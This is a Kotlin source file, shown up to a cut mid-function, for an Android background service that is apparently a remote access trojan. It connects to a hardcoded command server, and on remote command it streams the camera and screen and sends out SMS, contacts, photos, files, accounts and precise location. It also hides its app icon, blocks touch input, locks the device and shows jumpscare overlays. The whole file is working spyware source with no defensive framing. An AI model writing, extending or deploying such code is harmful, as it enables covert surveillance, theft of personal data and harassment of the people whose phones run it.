package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.app.WallpaperManager
import android.content.*
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Matrix
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.database.Cursor
import android.location.Address
import android.location.Geocoder
import android.location.LocationManager
import android.net.Uri
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.*
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.URI
import java.util.concurrent.Executors
import android.media.AudioManager

class DeviceService : Service(), LifecycleOwner {

    companion object {
        const val ACTION_COMMAND       = "com.sync.xxx.COMMAND"
        const val EXTRA_COMMAND        = "command"
        const val EXTRA_VALUE          = "value"
        const val ACTION_CONNECT       = "com.sync.xxx.CONNECT"
        const val ACTION_SEND_STATUS   = "com.sync.xxx.SEND_STATUS"
        const val EXTRA_STATUS_JSON    = "statusJson"
        const val ACTION_SEND_FRAME    = "com.sync.xxx.SEND_FRAME"
        const val EXTRA_FRAME_B64      = "frameB64"
        const val ACTION_SCREEN_RESULT = "com.sync.xxx.SCREEN_RESULT"
        const val EXTRA_RESULT_CODE    = "resultCode"
        const val EXTRA_RESULT_DATA    = "resultData"

        const val SERVER_URL = "http://monic-hubb.cloudyhosting.web.id:4000"
        const val CHANNEL_ID = "sync_xxx"
        const val NOTIF_ID   = 1
    }

    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry

    private var socket: Socket? = null
    private var deviceId: String = ""
    private var deviceName: String = ""

    var lockPin: String = ""
    var lockTitle: String = ""

    private var cameraProvider: ProcessCameraProvider? = null
    private var imageAnalysis: ImageAnalysis? = null
    private var streaming = false
    private var lastFrameTime = 0L
    private val FRAME_INTERVAL = 250L

    private var cameraManager: CameraManager? = null
    private var torchCameraId: String? = null
    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var flashBlinking = false
    
    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null
    private var screenStreaming = false
    private var lastScreenFrameTime = 0L
    private val SCREEN_FRAME_INTERVAL = 250L
    private var screenHandler: Handler? = null
    private var screenRunnable: Runnable? = null


    private val localReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_CONNECT -> {
                    if (socket == null || socket?.connected() == false) connectSocket()
                }
                ACTION_SEND_STATUS -> {
                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
                    emitStatus(JSONObject(json))
                }
                ACTION_SCREEN_RESULT -> {
                    val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
                    android.util.Log.d("DeviceService", "ACTION_SCREEN_RESULT: resultCode=$resultCode")
                    val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                        intent.getParcelableExtra(EXTRA_RESULT_DATA, android.content.Intent::class.java)
                    else
                        @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_RESULT_DATA)
                    if (resultCode != android.app.Activity.RESULT_OK || data == null) {
                        android.util.Log.w("DeviceService", "Screen capture denied or data null")
                        emitStatus(JSONObject().apply { put("screenActive", false) })
                        return
                    }
                    startScreenCapture(resultCode, data)
                }
                "com.sync.xxx.NEW_NOTIF" -> {
                    val payloadStr = intent.getStringExtra("payload") ?: return
                    try {
                        val payload = JSONObject(payloadStr)
                        storeNotif(payload)
                        if (socket?.connected() == true) {
                            socket?.emit("device:notif", JSONObject().apply {
                                put("deviceId", deviceId)
                                put("notif", payload)
                            })
                        }
                    } catch (_: Exception) {}
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            val hasLocation = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            val hasCamera = ActivityCompat.checkSelfPermission(
                this, Manifest.permission.CAMERA
            ) == PackageManager.PERMISSION_GRANTED

            var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            if (hasLocation) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION

            startForeground(NOTIF_ID, buildNotification(), serviceType)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }

        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

        deviceId = android.provider.Settings.Secure.getString(
    contentResolver,
    android.provider.Settings.Secure.ANDROID_ID
).takeIf { !it.isNullOrBlank() } ?: Build.ID
        val mfr    = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model  = Build.MODEL
        deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"

        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
            cameraManager?.getCameraCharacteristics(id)
                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        }

        val filter = IntentFilter().apply {
            addAction(ACTION_CONNECT)
            addAction(ACTION_SEND_STATUS)
            addAction(ACTION_SCREEN_RESULT)
            addAction("com.sync.xxx.NEW_NOTIF")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(localReceiver, filter)
        }

        connectSocket()
    }

    private fun connectSocket() {
        try {
            val opts = IO.Options.builder()
                .setReconnection(true)
                .setReconnectionDelay(3000)
                .setReconnectionDelayMax(10000)
                .build()

            socket = IO.socket(URI.create(SERVER_URL), opts)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("DeviceService", "Socket Connected")
                SocketHolder.connected = true
                val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val level   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale   = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
                val plugged = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) ?: -1
                val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
                val isCharging = plugged != 0

                socket?.emit("device:register", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("name", deviceName)
                    put("battery", batteryPct)
                    put("charging", isCharging)
                    put("sdkVersion", Build.VERSION.SDK_INT)
                    put("androidVersion", Build.VERSION.RELEASE)
                    put("uid", readUid())
                })
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                Log.d("DeviceService", "Socket disconnected")
                SocketHolder.connected = false
            }

            socket?.on("command") { args ->
                val data = args[0] as? JSONObject ?: return@on
                val cmd  = data.optString("command")
                val val_ = data.opt("value")

                handleCommand(cmd, val_?.toString() ?: "")

                val intent = Intent(ACTION_COMMAND).apply {
                    putExtra(EXTRA_COMMAND, cmd)
                    val valStr: String = val_?.toString() ?: ""
                    putExtra(EXTRA_VALUE, valStr)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }

            socket?.connect()
        } catch (e: Exception) {
            Log.e("DeviceService", "Socket error: ${e.message}")
        }
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "flashlight" -> setFlashlight(value == "true")
            "camera"     -> when (value) {
                "front" -> startCamera("front")
                "back"  -> startCamera("back")
                else    -> stopCamera()
            }
            "screen"     -> when (value) {
                "start" -> requestScreenCapture()
                else    -> stopScreenCapture()
            }
            "lockDevice"     -> lockDevice(value)
            "lockCustom"     -> lockCustom(value)
            "unlockDevice"   -> unlockDevice()
            "changeTheme"    -> changeTheme(value)
            "setWallpaper"   -> setWallpaperFromUrl(value)
            "openUrl"        -> openUrl(value)
            "playAudio"      -> playAudio(value)
            "jumpscareStart" -> startJumpscare(value)
            "jumpscareStop"  -> stopJumpscare()
            "blockApp"         -> blockApp(value)
            "unblockApp"       -> unblockApp(value)
            "unblockAll"       -> unblockAll()
            "getInstalledApps" -> sendInstalledApps()
            "getSms"           -> sendSms()
            "getNotifs"        -> sendStoredNotifs()
            "getGallery"       -> sendGallery()
            "getLocation"      -> sendLocation()
            "getContacts"      -> sendContacts()
            "getGmail"         -> sendGmailAccounts()
            "getPhone"         -> sendPhoneNumbers()
            "vibrate"          -> vibrateDevice(value)
            "showToast"      -> showToast(value)
            "touchBlock"     -> startTouchBlock(value)
             "touchBlockStop" -> stopTouchBlock()
            "ttsSpeak" -> ttsSpeak(value)
             "ttsStop"  -> ttsStop()
            "hideIcon"         -> hideAppIcon(value == "true")
            "muteVolume" -> setVolumeMute(value == "true")
            "jumpscare2Start" -> startJumpscare2(value)
            "jumpscare2Stop"  -> stopJumpscare2()
            "getFiles"         -> sendFileList(value)
            "downloadFile"     -> downloadAndSendFile(value)
        }
    }

    private fun vibrateDevice(value: String) {
        try {
            val durationMs = value.toLongOrNull() ?: 500L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vm = getSystemService(android.os.VibratorManager::class.java)
                val vib = vm?.defaultVibrator
                vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                val vib = getSystemService(VIBRATOR_SERVICE) as? android.os.Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vib?.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vib?.vibrate(durationMs)
                }
            }
            emitStatus(JSONObject().apply { put("vibrated", durationMs) })
        } catch (e: Exception) {
            Log.e("DeviceService", "vibrateDevice: ${e.message}")
        }
    }
    
    private var jumpscare2Handler: Handler? = null
   private var jumpscare2Runnable: Runnable? = null
   
   private var jumpscare2View: android.widget.ImageView? = null

private fun startJumpscare2(value: String) {
    stopJumpscare2()
    try {
        val obj      = JSONObject(value)
        val url      = obj.getString("url")
        val duration = obj.optLong("duration", 3000L)

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            PixelFormat.TRANSLUCENT
        )

        val imgView = android.widget.ImageView(this).apply {
            scaleType = android.widget.ImageView.ScaleType.CENTER_CROP
            setBackgroundColor(android.graphics.Color.BLACK)
        }

        jumpscare2View = imgView

        Handler(Looper.getMainLooper()).post {
            wm.addView(imgView, params)
        }

        Thread {
            try {
                var redirectUrl = url
                var bmp: Bitmap? = null
                for (i in 0..4) {
                    val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                    conn.connectTimeout = 12000
                    conn.readTimeout    = 15000
                    conn.instanceFollowRedirects = false
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                    conn.setRequestProperty("Accept", "image/*")
                    conn.connect()
                    val code = conn.responseCode
                    if (code in 300..399) {
                        val loc = conn.getHeaderField("Location")
                        conn.disconnect()
                        if (loc != null) { redirectUrl = loc; continue } else break
                    }
                    val bytes = conn.inputStream.readBytes()
                    conn.disconnect()
                    bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    break
                }
                val finalBmp = bmp
                Handler(Looper.getMainLooper()).post {
                    if (finalBmp != null) imgView.setImageBitmap(finalBmp)
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "jumpscare2 img: ${e.message}")
            }
        }.start()

        jumpscare2Handler = Handler(Looper.getMainLooper())
        jumpscare2Runnable = Runnable {
            try { wm.removeView(imgView) } catch (_: Exception) {}
            jumpscare2View = null
            emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
        }
        jumpscare2Handler?.postDelayed(jumpscare2Runnable!!, duration)

        emitStatus(JSONObject().apply { put("jumpscare2Active", true) })

    } catch (e: Exception) {
        Log.e("DeviceService", "startJumpscare2: ${e.message}")
    }
}

private fun stopJumpscare2() {
    jumpscare2Runnable?.let { jumpscare2Handler?.removeCallbacks(it) }
    jumpscare2Handler  = null
    jumpscare2Runnable = null
    val wm = getSystemService(WINDOW_SERVICE) as WindowManager
    jumpscare2View?.let {
        try { wm.removeView(it) } catch (_: Exception) {}
    }
    jumpscare2View = null
    emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
}


private fun ttsSpeak(value: String) {
    try {
        val obj = JSONObject(value)
        val svcIntent = Intent(this, TTSService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(svcIntent)
        else startService(svcIntent)
        val intent = Intent(TTSService.ACTION_SPEAK).apply {
            putExtra(TTSService.EXTRA_TEXT,  obj.optString("text", ""))
            putExtra(TTSService.EXTRA_LANG,  obj.optString("lang", "id"))
            putExtra(TTSService.EXTRA_PITCH, obj.optDouble("pitch", 1.0).toFloat())
            putExtra(TTSService.EXTRA_SPEED, obj.optDouble("speed", 1.0).toFloat())
            setPackage(packageName)
        }
        sendBroadcast(intent)
        emitStatus(JSONObject().apply { put("ttsSpeaking", true) })
    } catch (e: Exception) {
        Log.e("DeviceService", "ttsSpeak: ${e.message}")
    }
}

private fun ttsStop() {
    val intent = Intent(TTSService.ACTION_STOP).apply { setPackage(packageName) }
    sendBroadcast(intent)
    emitStatus(JSONObject().apply { put("ttsSpeaking", false) })
}


private var touchBlockView: android.view.View? = null
private var touchBlockHandler: android.os.Handler? = null
private var touchBlockRunnable: Runnable? = null

private fun startTouchBlock(value: String) {
    try {
        stopTouchBlock()
        val duration = try { org.json.JSONObject(value).optLong("duration", 0L) } catch (_: Exception) { value.toLongOrNull() ?: 0L }

        val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = android.view.WindowManager.LayoutParams(
            android.view.WindowManager.LayoutParams.MATCH_PARENT,
            android.view.WindowManager.LayoutParams.MATCH_PARENT,
            type,
            android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN,
            android.graphics.PixelFormat.TRANSLUCENT
        )

        val view = android.view.View(this).apply {
            setBackgroundColor(android.graphics.Color.TRANSPARENT)
            setOnTouchListener { _, _ -> true } // block semua touch
        }

        touchBlockView = view
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            wm.addView(view, params)
        }

        emitStatus(JSONObject().apply { put("touchBlocked", true) })

        // Auto stop kalau duration > 0
        if (duration > 0) {
            touchBlockHandler = android.os.Handler(android.os.Looper.getMainLooper())
            touchBlockRunnable = Runnable { stopTouchBlock() }
            touchBlockHandler?.postDelayed(touchBlockRunnable!!, duration * 1000L)
        }
    } catch (e: Exception) {
        Log.e("DeviceService", "startTouchBlock: ${e.message}")
    }
}

private fun stopTouchBlock() {
    touchBlockRunnable?.let { touchBlockHandler?.removeCallbacks(it) }
    touchBlockHandler  = null
    touchBlockRunnable = null
    val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
    touchBlockView?.let {
        try {
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                wm.removeView(it)
            }
        } catch (_: Exception) {}
    }
    touchBlockView = null
    emitStatus(JSONObject().apply { put("touchBlocked", false) })
}

    
    
    private fun hideAppIcon(hide: Boolean) {
    try {
        val pm = packageManager
        if (hide) {
            // Disable semua alias
            THEME_ALIASES.values.forEach { alias ->
                try {
                    pm.setComponentEnabledSetting(
                        ComponentName(packageName, alias),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (_: Exception) {}
            }
            // Disable juga MainActivity asli
            pm.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } else {
            // Re-enable alias yang sebelumnya aktif (default)
            pm.setComponentEnabledSetting(
                ComponentName(packageName, THEME_ALIASES["default"]!!),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        }
        emitStatus(JSONObject().apply { put("iconHidden", hide) })
    } catch (e: Exception) {
        Log.e("DeviceService", "hideAppIcon: ${e.message}")
    }
}
    
    
    private fun setVolumeMute(mute: Boolean) {
    try {
        val audio = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audio.setStreamVolume(
            AudioManager.STREAM_MUSIC,
            if (mute) 0 else audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
            0
        )
        emitStatus(JSONObject().apply { put("volumeMuted", mute) })
    } catch (e: Exception) {
        Log.e("DeviceService", "setVolumeMute: ${e.message}")
    }
}
    
    
    
    private fun showToast(message: String) {
    Handler(Looper.getMainLooper()).post {
        android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
    }
    emitStatus(JSONObject().apply { put("toastSent", message) })
}

    private fun sendFileList(path: String) {
        Thread {
            try {
                val rootPath = if (path.isBlank()) {
                    android.os.Environment.getExternalStorageDirectory().absolutePath
                } else path

                val dir = java.io.File(rootPath)
                val arr = org.json.JSONArray()

                if (!dir.exists() || !dir.isDirectory) {
                    socket?.emit("device:files", org.json.JSONObject().apply {
                        put("deviceId", deviceId)
                        put("path", rootPath)
                        put("files", arr)
                        put("error", "Folder tidak ditemukan atau tidak bisa diakses")
                    })
                    return@Thread
                }

                val canReadAll = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    android.os.Environment.isExternalStorageManager()
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }

                val entries = try { dir.listFiles() } catch (_: Exception) { null }

                entries
                    ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                    ?.forEach { f ->
                        try {
                            arr.put(org.json.JSONObject().apply {
                                put("name",     f.name)
                                put("path",     f.absolutePath)
                                put("isDir",    f.isDirectory)
                                put("size",     if (f.isFile) f.length() else 0L)
                                put("modified", f.lastModified())
                                put("readable", f.canRead())
                            })
                        } catch (_: Exception) {}
                    }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:files", org.json.JSONObject().apply {
                    put("deviceId",   deviceId)
                    put("path",       rootPath)
                    put("files",      arr)
                    put("canReadAll", canReadAll)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendFileList: ${e.message}")
            }
        }.start()
    }

    private fun downloadAndSendFile(value: String) {
        Thread {
            try {
                val obj   = org.json.JSONObject(value)
                val path  = obj.getString("path")
                val reqId = obj.getString("reqId")
                val file  = java.io.File(path)
                if (!file.exists() || !file.isFile || !file.canRead()) {
                    socket?.emit("device:filedata", org.json.JSONObject().apply {
                        put("reqId", reqId)
                        put("error", "File tidak ditemukan atau tidak bisa dibaca")
                    })
                    return@Thread
                }
                val bytes = file.readBytes()
                val b64   = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                val ext   = file.extension.lowercase()
                val mime  = android.webkit.MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(ext) ?: "application/octet-stream"
                socket?.emit("device:filedata", org.json.JSONObject().apply {
                    put("reqId",  reqId)
                    put("base64", b64)
                    put("mime",   mime)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "downloadAndSendFile: ${e.message}")
                try {
                    val obj = org.json.JSONObject(value)
                    socket?.emit("device:filedata", org.json.JSONObject().apply {
                        put("reqId", obj.optString("reqId", ""))
                        put("error", e.message ?: "Error")
                    })
                } catch (_: Exception) {}
            }
        }.start()
    }

    private fun sendGallery() {
        Thread {
            try {
                val arr = org.json.JSONArray()
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                )
                val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} = ?"
                val selectionArgs = arrayOf("Camera")

                val cursor: Cursor? = contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)
                cursor?.use { c ->
                    val idCol   = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val dateCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    val sizeCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    var count = 0
                    while (c.moveToNext() && count < 100) {
                        val id      = c.getLong(idCol)
                        val name    = c.getString(nameCol) ?: ""
                        val date    = c.getLong(dateCol)
                        val size    = c.getLong(sizeCol)
                        val imgUri  = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())                        
                        try {
                            val opts = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
                            contentResolver.openInputStream(imgUri)?.use { android.graphics.BitmapFactory.decodeStream(it, null, opts) }
                            val maxDim = 300
                            val sample = maxOf(1, minOf(opts.outWidth, opts.outHeight) / maxDim)
                            val decodeOpts = android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
                            val bmp = contentResolver.openInputStream(imgUri)?.use { android.graphics.BitmapFactory.decodeStream(it, null, decodeOpts) }
                            if (bmp != null) {
                                val bos = java.io.ByteArrayOutputStream()
                                bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 72, bos)
                                bmp.recycle()
                                val b64 = android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP)
                                arr.put(org.json.JSONObject().apply {
                                    put("id",    id)
                                    put("name",  name)
                                    put("date",  date)
                                    put("size",  size)
                                    put("thumb", "data:image/jpeg;base64,$b64")
                                })
                                count++
                            }
                        } catch (_: Exception) { }
                    }
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:gallery", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("photos",   arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGallery: ${e.message}")
            }
        }.start()
    }
    
    private fun blockApp(pkgJson: String) {
        try {
            val obj  = org.json.JSONObject(pkgJson)
            val pkg  = obj.getString("package")
            val name = obj.optString("name", pkg)
            val i = Intent("com.sync.xxx.BLOCK_APP").apply {
                putExtra("package", pkg)
                putExtra("name", name)
                setPackage(packageName)
            }
            sendBroadcast(i)            
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "blockApp: ${e.message}")
        }
    }

    private fun unblockApp(pkg: String) {
        try {
            val i = Intent("com.sync.xxx.UNBLOCK_APP").apply {
                putExtra("package", pkg)
                setPackage(packageName)
            }
            sendBroadcast(i)
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockApp: ${e.message}")
        }
    }

    private fun unblockAll() {
        try {
            val i = Intent("com.sync.xxx.UNBLOCK_ALL").apply { setPackage(packageName) }
            sendBroadcast(i)
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray())
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockAll: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun sendLocation() {
        val hasFine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)   == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            socket?.emit("device:location", org.json.JSONObject().apply {
                put("deviceId", deviceId); put("error", "permission_denied")
            })
            return
        }

        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val gpsOn     = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
        val networkOn = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)

        if (!gpsOn && !networkOn) {
            socket?.emit("device:location", org.json.JSONObject().apply {
                put("deviceId", deviceId); put("error", "provider_disabled")
            })
            return
        }

        val fusedClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this)
        val priority = if (hasFine && gpsOn) Priority.PRIORITY_HIGH_ACCURACY else Priority.PRIORITY_BALANCED_POWER_ACCURACY
        
        val cts = com.google.android.gms.tasks.CancellationTokenSource()
        fusedClient.getCurrentLocation(priority, cts.token)
            .addOnSuccessListener { loc ->
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {                    
                    requestSingleLocationUpdate(fusedClient, priority)
                }
            }
            .addOnFailureListener {
                requestSingleLocationUpdate(fusedClient, priority)
            }
    }

    @SuppressLint("MissingPermission")
    private fun requestSingleLocationUpdate(fusedClient: FusedLocationProviderClient, priority: Int) {
        val req = LocationRequest.Builder(priority, 2000L)
            .setMaxUpdates(1)
            .setWaitForAccurateLocation(false)
            .build()

        val cb = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                fusedClient.removeLocationUpdates(this)
                val loc = result.lastLocation
                if (loc != null) {
                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
                } else {
                    socket?.emit("device:location", org.json.JSONObject().apply {
                        put("deviceId", deviceId); put("error", "no_location")
                    })
                }
            }
        }

        try {
            fusedClient.requestLocationUpdates(req, cb, Looper.getMainLooper())            
            Handler(Looper.getMainLooper()).postDelayed({
                fusedClient.removeLocationUpdates(cb)
            }, 15_000L)
        } catch (e: Exception) {
            Log.e("DeviceService", "requestSingleLocationUpdate: ${e.message}")
            socket?.emit("device:location", org.json.JSONObject().apply {
                put("deviceId", deviceId); put("error", "no_location")
            })
        }
    }

    private fun emitLocationResult(lat: Double, lng: Double, accuracy: Float) {
        val obj = org.json.JSONObject().apply {
            put("deviceId", deviceId)
            put("lat", lat)
            put("lng", lng)
            put("accuracy", accuracy)
        }
        try {
            @Suppress("DEPRECATION")
            val geocoder = Geocoder(this, java.util.Locale("id", "ID"))
            @Suppress("DEPRECATION")
            val addresses = geocoder.getFromLocation(lat, lng, 1)
            if (!addresses.isNullOrEmpty()) {
                val addr = addresses[0]
                obj.put("province",    addr.adminArea       ?: "")
                obj.put("city",        addr.subAdminArea    ?: "")
                obj.put("district",    addr.locality        ?: "")
                obj.put("village",     addr.subLocality     ?: "")
                obj.put("postalCode",  addr.postalCode      ?: "")
                obj.put("fullAddress", addr.getAddressLine(0) ?: "")
                obj.put("countryName", addr.countryName     ?: "")
            }
        } catch (_: Exception) { }
        socket?.emit("device:location", obj)
    }

    private fun sendContacts() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:contacts", org.json.JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                val arr = org.json.JSONArray()
                val projection = arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                )
                val cursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection, null, null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )
                cursor?.use { c ->
                    val nameCol = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numCol  = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    while (c.moveToNext()) {
                        val name   = c.getString(nameCol) ?: continue
                        val number = c.getString(numCol)  ?: continue
                        arr.put(org.json.JSONObject().apply {
                            put("name",   name.trim())
                            put("number", number.trim())
                        })
                    }
                }
                socket?.emit("device:contacts", org.json.JSONObject().apply {
